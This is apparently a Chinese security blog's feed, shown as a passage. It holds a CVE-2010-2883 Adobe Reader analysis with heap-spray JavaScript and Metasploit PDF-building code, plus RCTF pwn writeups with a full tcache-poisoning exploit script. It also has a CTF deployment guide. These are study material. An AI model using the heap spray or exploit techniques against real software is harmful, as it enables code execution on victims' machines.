src="/CVE-2010-2883-Adobe-Reader-TFF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA//3.png" alt></p><p><img src="/04/ckur473d8000cab155bfomfcj/4.png" alt></p><p>上面给eax复制为CreateFile的函数指针，后面开始调用这个函数</p><p><img src="/04/ckur473d8000cab155bfomfcj/5.png" alt></p><p>这里直接跳转到eax保存的指针所指向的地址(0x7C801A28)处</p><p><img src="/04/ckur473d8000cab155bfomfcj/6.png" alt></p><p>单步执行到CreateFileW处，查看栈中参数</p><p><img src="/04/ckur473d8000cab155bfomfcj/7.png" alt>****</p><p>这里都是CreateFileA的参数，来看看CreateFileA官方文档给出的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwCreationDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                hTemplateFile</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>lpFileName用于指定被创建文件的文件名。</p><p>dwDesiredAccess 用于指定访问权限一般都是读、写之类的。这里的GENERIC_ALL指的是采用所有可能的访问权限。</p><p>dwShareMode 用于指定请求的文件或设备的共享模式，这里指定的0代表了阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</p><p>lpSecurityAttributes 用于设置安全描述符和子进程是否可继承，这个属性可为NULL，这里用的就是NULL。</p><p>dwCreationDisposition 设置对文件执行的操作。这里的CREATE_ALWAYS代表总是会创建文件，即使目标文件已存在也会覆盖它。</p><p>dw FlagsAndAttributes 设置文件或设备属性和标志，这里给的值是FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY 代表该文件用于临时存储。</p><p>hTemplateFile 设置具有GENERIC_READ访问权限的模板文件的有效句柄。这个属性这里也没用到直接指定NULL。</p><p>总之这里创建了一个临时文件，文件名是iso88591。可以在当前样本pdf同目录下找到。</p><p>返回后用相同的方法构造处rop指令来调用CreateFileMappping，创建文件内存映射</p><p><img src="/04/ckur473d8000cab155bfomfcj/11.png" alt></p><p>参数为</p><p><img src="/04/ckur473d8000cab155bfomfcj/10.png" alt></p><p>然后执行MapViewOfFile函数</p><p><img src="/04/ckur473d8000cab155bfomfcj/12.png" alt></p><p>再通过类似的方法调用mmap</p><p><img src="/04/ckur473d8000cab155bfomfcj/13.png" alt></p><p>其中目的地址就是前面MapViewOfFile返回的地址，而源地址就是真正的ShellCode代码，将他复制到一段可执行可读写的内存段，以此绕过DEP保护。由于构造的ROP指令均位于不受ASLR保护的icucnv36.dll模块，因此也可绕过ASLR保护。</p><p>总结一下这部分由堆喷射覆盖在栈上的数据都做了一些什么。主要做了新建临时文件，将文件映射到内存，将真正的shellcode拷贝到内存的某一块区域并且解码这些shellcode然后执行。</p><h3 id="JavaScript实现HeapSpray"><a href="#JavaScript实现HeapSpray" class="headerlink" title="JavaScript实现HeapSpray"></a>JavaScript实现HeapSpray</h3><p>PDFStreamDumper打开恶意pdf文件，在第一个object处找到OpenAction，表示其在第11个obj中，PDF运行时会执行里面脚本</p><p><img src="/04/ckur473d8000cab155bfomfcj/14.png" alt></p><p>进入第11个obj，表示执行的js代码位于第12个obj中</p><p><img src="/04/ckur473d8000cab155bfomfcj/15.png" alt></p><p>进入12obj，发现实现堆喷射的js脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%······30%u1602%u50d3'</span> );</span><br><span class="line"><span class="keyword">var</span> block = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (block.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) </span><br><span class="line">    block+=block;</span><br><span class="line">SP = block.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">SP += shellcode;</span><br><span class="line">SP += block;</span><br><span class="line">slackspace = SP.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(slackspace.length &lt; <span class="number">0x80000</span>) </span><br><span class="line">    slackspace += slackspace;</span><br><span class="line">bigblock = slackspace.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> memory = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (count=<span class="number">0</span>;count&lt;<span class="number">0x1f0</span>;count++) memory[cout]=bigblock+<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure><p>所有的shellcode都被转化成了十六进制的转义序列，经过unescape解码之后存储在了var_shellcode之中。var_c变量存储了“%u0c0c%u0c0c”，接下来用了一个while循环叠加block，用于覆盖内存中的数据，采用0x0c0c0c0c的原因是因为它所对应的指令是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or al,0x0C</span><br></pre></td></tr></table></figure><p>这样的指令执行的效果对al寄存器不会产生任何影响很适合当作滑板指令是堆喷射的常用技巧。</p><p>接下来的SP保存了前面的所有滑板指令以及shellcode。最关键的实现堆喷射的语句是new Array()</p><p>利用数组来开辟内存区域，然后通过填充数组数据的方式来喷射shellcode。</p><h2 id="PDF格式-amp-样本构造"><a href="#PDF格式-amp-样本构造" class="headerlink" title="PDF格式&amp;样本构造"></a>PDF格式&amp;样本构造</h2><p>先回顾一下漏洞的触发点，漏洞的触发点是在解析TTF字体的SING表时出现的问题。那很显然我们首先要了解一下TTF的格式定义以及SING表的具体字段。同时我们还需要了解PDF格式规范当中是如何来引用TTF字体文件的，以及PDF是怎么支持JavaScript脚本执行的。</p><p>先来了解一下PDF的基本格式</p><p><img src="/04/ckur473d8000cab155bfomfcj/16.png" alt></p><p>首先看到的是Header部分。这是PDF文件的开始部分。主要用来指明当前PDF文件所遵循的PDF格式标准版本。例如%PDF-1.5</p><p>Body部分包含了PDF文档的主要内容，所有向用户展现的内容都在此存放。</p><p>Cross-reference table 即交叉引用表，包含了当前PDF文档中所有对象的引用、偏移量以及字节长度。借助这个引用表可以在全文档范围内随机访问任何一个对象，非常的方便。</p><p>Trailer主要包含了指向交叉引用表的指针以及一些关键对象的指针并且以%%EOF标记文件结束，帮助符合标准的阅读器能够快速定位到需要的对象。所有的PDF阅读器都是要从这里开始解析。</p><p>了解完PDF基本格式。秉承着用到什么再提什么的原则，我们这里通过分析MSF提供的exp来帮助理解PDF文档的构造过程。</p><p>定位到 def make_pdf(ttf, js) 的部分，这里是创建pdf的核心位置。</p><p>来到/opt/metasploit-framework/embedded/framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</p><p>这个脚本是用ruby语言编写的，对于ruby语法的相关细节本文不再赘述。</p><p>定位到 def make_pdf(ttf, js) 的部分，这里是创建pdf的核心位置。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xref = []</span><br><span class="line">eol = <span class="string">"n"</span></span><br><span class="line">endobj = <span class="string">"endobj"</span> &lt;&lt; eol</span><br></pre></td></tr></table></figure><p>看到首先定义了几个接下来会用到的字符以及交叉引用表xref。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pdf = <span class="string">"%PDF-1.5"</span> &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; <span class="string">"%"</span> &lt;&lt; random_non_ascii_string(<span class="number">4</span>) &lt;&lt; eol</span><br></pre></td></tr></table></figure><p>这里描述的是Header部分的内容，首先定义了版本号，这个样本遵循的是PDF1.5版本。</p><p>接下来调用了一个random_non_ascii_string函数</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_non_ascii_string</span><span class="params">(count)</span></span></span><br><span class="line">  result = <span class="string">""</span></span><br><span class="line">  count.times <span class="keyword">do</span></span><br><span class="line">    result &lt;&lt; (rand(<span class="number">128</span>) + <span class="number">128</span>).chr</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>该函数用于随机出不再ASCII范围内的字符。换句话说这里随机了4个字符。关于这四个字符的作用。Adobe给出的PDF文档里是这样描述的</p><blockquote><p>If a PDF file contains binary data, as most <strong>do</strong>, the header line shall be immediately followed <strong>by</strong> a <strong>comment</strong> line containing <strong>at</strong> <strong>least</strong> four binary <strong>characters</strong>—that <strong>is</strong> ,<strong>characters</strong> whose codes <strong>are</strong> 128 <strong>or</strong> greater. This ensures proper behaviour <strong>of</strong> <strong>file</strong> transfer applications that inspect <strong>data</strong> near the <strong>beginning</strong> <strong>of</strong> a <strong>file</strong> <strong>to</strong> determine whether <strong>to</strong> <strong>treat</strong> the <strong>file</strong>‘s contents as text or as binary.</p></blockquote><p>这四个code大于128的字符用于确保当前PDF文档被当作二进制文件来对待而不是文本文件。</p><p>看完了Header部分的实现，再看Body部分的实现之前，先来了解一下Body部分大致的组织结构。</p><p><img src="/04/ckur473d8000cab155bfomfcj/17.png" alt></p><p>继续往下看会看到catalog对象的定义</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xref &lt;&lt; pdf.length</span><br><span class="line">pdf &lt;&lt; io_def(<span class="number">1</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/Pages "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/Type /Catalog"</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/OpenAction "</span>) &lt;&lt; io_ref(<span class="number">11</span>) &lt;&lt; eol</span><br><span class="line"><span class="comment"># The AcroForm is required to get icucnv36.dll to load</span></span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/AcroForm "</span>) &lt;&lt; io_ref(<span class="number">13</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; endobj</span><br></pre></td></tr></table></figure><p>这里用到了两个io_def和n_obfu函数。此处的xref &lt;&lt; pdf.length用于记录对象的偏移量。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_def</span><span class="params">(id)</span></span> </span><br><span class="line">    <span class="string">"%d 0 obj n"</span> % id</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>下载AdobeReader 9.4.0版本提取CoolType.dll，定位到相同的位置</p><p>很显然这里不再是调用strcat而是改为调用sub_813391E函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:0813391E                 push    esi</span><br><span class="line">.text:0813391F                 mov     esi, [esp+4+arg_0]</span><br><span class="line">.text:08133923                 push    esi             ; char *</span><br><span class="line">.text:08133924                 call    strlen</span><br><span class="line">.text:08133929                 pop     ecx</span><br><span class="line">.text:0813392A                 mov     ecx, [esp+4+arg_8]</span><br><span class="line">.text:0813392E                 cmp     ecx, eax</span><br><span class="line">.text:08133930                 ja      short loc_8133936</span><br><span class="line">.text:08133932                 mov     eax, esi</span><br><span class="line">.text:08133934                 pop     esi</span><br><span class="line">.text:08133935                 retn</span><br><span class="line">.text:08133936 loc_8133936:                            ; CODE XREF: sub_813391E+12↑j</span><br><span class="line">.text:08133936                 sub     ecx, eax</span><br><span class="line">.text:08133938                 dec     ecx</span><br><span class="line">.text:08133939                 push    ecx             ; size_t</span><br><span class="line">.text:0813393A                 push    [esp+8+arg_4]   ; char *</span><br><span class="line">.text:0813393E                 add     eax, esi</span><br><span class="line">.text:08133940                 push    eax             ; char *</span><br><span class="line">.text:08133941                 call    ds:strncat</span><br><span class="line">.text:08133947                 add     esp, 0Ch</span><br><span class="line">.text:0813394A                 pop     esi</span><br><span class="line">.text:0813394B                 retn</span><br></pre></td></tr></table></figure><p>该函数获取了字段的长度，判断是否超出限制。如果超出限制就用strncat限制了拷贝的字节数从而修复了该漏洞。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.anquanke.com/post/id/179681#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179681#h2-1</a></p><p>漏洞战争p15</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在Adobe Reader和Acrobat 9.4之前的9.x版本中用于实现CoolType(清晰显示文本的字体还原技术)技术的库CoolType.dll中在解析TrueType字体文件中的SING表的uniqueName字段时调用的strcat函数&lt;strong&gt;未检查长度&lt;/strong&gt;导致存在基于栈的缓冲区溢出漏洞。远程攻击者可构造恶意的SmartINdependent Glyphlets (SING)表修改内存数据从而执行任意代码。&lt;/p&gt;
    
    </summary>
    
      <category term="CVE" scheme="wood1314.github.io/categories/CVE/"/>
    
    
      <category term="CVE" scheme="wood1314.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Rctf writeup</title>
    <link href="wood1314.github.io/year/06/04/ckur473dc000kab15ltlegip5/"/>
    <id>wood1314.github.io/year/06/04/ckur473dc000kab15ltlegip5/</id>
    <published>2020-06-04T09:18:19.000Z</published>
    <updated>2020-06-04T09:46:45.147Z</updated>
    
    <content type="html"><![CDATA[<p>没去打比赛，留着慢慢复现~</p><a id="more"></a><h2 id="0x1-note"><a href="#0x1-note" class="headerlink" title="0x1 note"></a>0x1 note</h2><p>现在刷来刷去，觉得堆体最大的作用就是让自己调试越来越熟练，看ida越来越熟练，没学到什么新的知识，后面要多刷能让自己学到东西的题目，多复现CVE了。</p><h3 id="1-1-漏洞分析"><a href="#1-1-漏洞分析" class="headerlink" title="1.1 漏洞分析"></a>1.1 漏洞分析</h3><ol><li>所有的下标判断没有判断负数</li><li>有一个函数里存在堆溢出</li></ol><h3 id="1-2-利用技巧"><a href="#1-2-利用技巧" class="headerlink" title="1.2 利用技巧"></a>1.2 利用技巧</h3><ol><li>calloc不会使用tcache</li><li>tcache链不会判断chunk的size</li></ol><h3 id="1-3-利用思路"><a href="#1-3-利用思路" class="headerlink" title="1.3 利用思路"></a>1.3 利用思路</h3><ol><li>用show泄露libc</li><li>用add和sell布置好tcache链</li><li>用溢出函数覆盖fd</li><li>三次malloc拿shell</li></ol><h3 id="1-4-exp"><a href="#1-4-exp" class="headerlink" title="1.4 exp"></a>1.4 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./note'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">': \n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">once</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'7'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">': \n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'6'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': \n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">-5</span>)</span><br><span class="line">data_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">sh.recv(<span class="number">16</span>)</span><br><span class="line">libcbase = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x1e5760</span></span><br><span class="line">one_gadget = libcbase + <span class="number">0xe237f</span></span><br><span class="line">log.success(<span class="string">'data_addr: '</span> + hex(data_addr))</span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#set money</span></span><br><span class="line">payload = p64(data_addr) + p32(<span class="number">0xffffff</span>)</span><br><span class="line">edit(<span class="number">-5</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ready chunk</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache poision</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x1e4c30</span></span><br><span class="line">content = <span class="string">''</span></span><br><span class="line">content += <span class="string">'a'</span>*<span class="number">0x50</span></span><br><span class="line">content += p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">content += p64(malloc_hook)</span><br><span class="line">once(<span class="number">0</span>,content+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc twice</span></span><br><span class="line">New(<span class="string">"a"</span>+<span class="string">'\n'</span>)</span><br><span class="line">sell(<span class="number">-2</span>)</span><br><span class="line">New(p64(one_gadget)+<span class="string">'\n'</span>)</span><br><span class="line">sell(<span class="number">-2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">sh.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;没去打比赛，留着慢慢复现~&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
      <category term="writeup" scheme="wood1314.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>pwn题部署</title>
    <link href="wood1314.github.io/year/06/01/ckur473eh0037ab15a7823qms/"/>
    <id>wood1314.github.io/year/06/01/ckur473eh0037ab15a7823qms/</id>
    <published>2020-06-01T12:04:29.000Z</published>
    <updated>2020-06-01T12:11:44.695Z</updated>
    
    <content type="html"><![CDATA[<p>ctfd上的pwn题部署，服务器系统centos</p><a id="more"></a><h2 id="docker-docker-compose安装"><a href="#docker-docker-compose安装" class="headerlink" title="docker, docker-compose安装"></a>docker, docker-compose安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">yum install -y docker-ce</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install python-pip</span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose</span><br></pre></td></tr></table></figure><h2 id="Pwn题部署"><a href="#Pwn题部署" class="headerlink" title="Pwn题部署"></a>Pwn题部署</h2><p>基于<code>xinted + docker</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br><span class="line">rm ctf_xinetd/bin/helloworld</span><br><span class="line">cp pwn ctf_xinetd/bin/pwn</span><br><span class="line">echo &lt;newflag&gt; &gt; ctf_xinetd/bin/flag</span><br><span class="line">vim ctf_xinetd/ctf.xinetd</span><br></pre></td></tr></table></figure><p><code>ctf.xinetd</code>中主要修改<code>server_args = --userspec=1000:1000 /home/ctf ./helloworld</code>中的<code>helloworld</code>为二进制文件名称(<code>pwn</code>).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ctf_xinetd</span><br><span class="line">sudo docker build -t &quot;mypwn&quot; .</span><br><span class="line">sudo docker run -d -p &quot;0.0.0.0:8001:9999&quot; -h &quot;mypwn&quot; --name=&quot;mypwn&quot; mypwn</span><br></pre></td></tr></table></figure><p><code>pwn</code>题要先关闭缓冲区.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br></pre></td></tr></table></figure><p>完成后可以<code>nc 127.0.0.1 端口号</code>来查看是否成功</p><p>阿里云等服务器需要把设置的端口添加到安全组里否则远程可能无法连接上</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctfd上的pwn题部署，服务器系统centos&lt;/p&gt;
    
    </summary>
    
      <category term="环境" scheme="wood1314.github.io/categories/%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="tools" scheme="wood1314.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯writeup</title>
    <link href="wood1314.github.io/year/05/12/ckur473f00059ab150l8clubp/"/>
    <id>wood1314.github.io/year/05/12/ckur473f00059ab150l8clubp/</id>
    <published>2020-05-12T15:03:29.000Z</published>
    <updated>2020-05-24T10:02:23.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>这次的pwn基本上都是vm pwn，虚拟指令集，这类题代码量大，需要逆向时间长。但做这类题的关键点在于找到虚拟机中和真实环境的交互点，找到可以泄露真实地址的方式之后这种题基本就稳了。</p><a id="more"></a><h2 id="0x1-boom1"><a href="#0x1-boom1" class="headerlink" title="0x1 boom1"></a>0x1 boom1</h2><h3 id="1-1-题目分析与解题思路"><a href="#1-1-题目分析与解题思路" class="headerlink" title="1.1 题目分析与解题思路"></a>1.1 题目分析与解题思路</h3><p>这道题就是一个语言解析器，也就是你输入什么代码就执行什么，但是函数只能用一次。</p><p>而这道题逃逸的突破口在于它可以用程序里的变量来泄露它真机中的真实地址。</p><p>解题思路是用它自身的变量来获取libc，然后打exit_hook即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 